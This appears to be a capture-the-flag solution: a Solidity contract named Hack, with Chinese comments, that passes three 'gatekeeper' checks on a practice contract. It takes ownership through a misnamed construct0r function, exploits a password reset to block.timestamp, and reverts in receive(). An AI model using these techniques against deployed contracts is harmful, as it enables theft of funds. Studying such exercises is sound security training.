// SPDX-License-Identifier: MIT
pragma solidity >0.8.4;
contract Hack{
    address public target;
    bool public  success=false;
    constructor(address add) payable {
        target=add;
    }
    function solve()public {
        bytes memory data = abi.encodeWithSignature("getAllowance(uint256)", 0);
        (success, ) = target.call(data);
        data = abi.encodeWithSignature("getAllowance(uint256)", block.timestamp);
        (success, ) = target.call(data);
        data = abi.encodeWithSignature("construct0r()");
        (success, ) = target.call(data);
        data = abi.encodeWithSignature("enter()");
        (success, ) = target.call(data);
    }

    receive() external payable { 
        revert();
    }
}

/* 
gatekeeper1：EOA调用攻击者合约调用construct0r
gatekeeper2: 利用验证失败会重置password为block.timestamp，连续验证两次password即可控制(也可以直接getStorageat(trick.address, 2))
gatekeeper3: reveive里面revert掉就能过了
 */